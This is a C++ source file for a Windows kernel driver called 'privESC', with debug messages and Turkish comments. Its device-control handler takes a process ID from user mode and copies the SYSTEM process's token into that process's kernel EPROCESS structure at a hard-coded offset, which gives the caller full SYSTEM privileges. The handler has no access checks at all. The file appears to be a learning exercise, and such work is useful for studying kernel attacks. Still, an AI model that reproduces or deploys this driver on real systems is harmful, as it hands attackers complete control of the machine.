#include "zerzevat.h"


NTSTATUS privESCdeviceControl(PDRIVER_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	auto& dict = stack->Parameters.DeviceIoControl;

	switch (dict.IoControlCode) {
	case IOCTL_SET_PRIVILEGE:
		DbgPrintEx(0, 0, "Wellcome To hell!!\n");
		auto getInput = (ProcessData*)Irp->AssociatedIrp.SystemBuffer;
		if (getInput == nullptr) {
			DbgPrintEx(0, 0, "Error in getting parameters!!\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		//DbgPrintEx(0, 0, "Handle -> 0x%x\n", getInput->ProcessHandle); // input handle bastýrmaya çalýþtýðým dümen

		PEPROCESS process,sys;
		status = PsLookupProcessByProcessId((HANDLE)getInput->pid, &process);
		unsigned long long *userProc = (unsigned long long*)&process;

		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "You are done by PsLookUp!!\n");
			return status;
		}
		//DbgPrintEx(0, 0, "userProc -> 0x%llx\n", userProc); // Check your EPROCESS, it should be match
		//DbgPrintEx(0, 0, "userProc -> 0x%llx\n", *userProc); // dereference
		//DbgPrintEx(0, 0, "userProc -> %llx\n", *(((unsigned long long*)(*userProc)) + 0xB5)); // You will find filename, just checking

		//*(((char*)(*userProc)) + 0x5A8) = 'X'; // HIT :wink:, trying to overwrite
		printer(((((unsigned long long)(*userProc)) + 0x5A8)), 15); // this will print filename of process. "ImageFileName"

		status = PsLookupProcessByProcessId((HANDLE)0x4, &sys);// (0x4) is system's pid
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "You are done by PsLookUp2!!\n");
			return status;
		}
		unsigned long long* sysProcess = (unsigned long long*) &sys;
		//DbgPrintEx(0, 0, "system pid-> %llx\n", *(((unsigned long long*)(*sysProcess)) + 0x88)); //still checking the structure

		*(((unsigned long long*)(*userProc)) + 0x97) = *(((unsigned long long*)(*sysProcess)) + 0x97); // 0x97*8 is the Token offset

		Irp->IoStatus.Status = STATUS_SUCCESS;
		Irp->IoStatus.Information = 0;
		IoCompleteRequest(Irp, IO_NO_INCREMENT); 
		break;
	}
	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(0, 0, "PrivESC: DriverEntry\n");

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\privESC");
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\privESC");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status;

	status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "IoCreateDevice Failed!! status -> (0x%X)\n", status);
		return status;
	}

	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		DbgPrintEx(0, 0, "IoCreateSymLink Failed!! status -> (0x%X)\n", status);
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)privESCCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)privESCCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)privESCdeviceControl;
	DriverObject->DriverUnload = privESCUnload;

	return STATUS_SUCCESS;
}


NTSTATUS privESCCreateClose(PDRIVER_OBJECT, PIRP Irp){
	PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
	switch (Stack->MajorFunction) {
	case IRP_MJ_CREATE:
		Irp->IoStatus.Status = STATUS_SUCCESS;
		break;

	case IRP_MJ_CLOSE:
		Irp->IoStatus.Status = STATUS_SUCCESS;
		break;
	default:
		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	
	return Irp->IoStatus.Status;
}

void privESCUnload(PDRIVER_OBJECT DriverObject) {
	DbgPrintEx(0, 0, "PrivESC: Unloaded\n");
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\privESC");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

void printer(unsigned long long startAddress, size_t size) {
	unsigned char* currentAddress = (unsigned char*)startAddress; 
	size_t i;
	size_t lineLength = 16;  
	char output[100];  

	for (i = 0; i < size; i++) {
		unsigned char currentByte = *(currentAddress + i); 


		if (i % lineLength == 0 && i != 0) {
			DbgPrintEx(0, 0, "\n");  
		}

		output[i % lineLength] = currentByte;

		if (i % lineLength == lineLength - 1 || i == size - 1) {
			output[i % lineLength + 1] = '\0';  
			DbgPrintEx(0, 0, "%s", output);  
		}
	}
	DbgPrintEx(0, 0, "\n");
}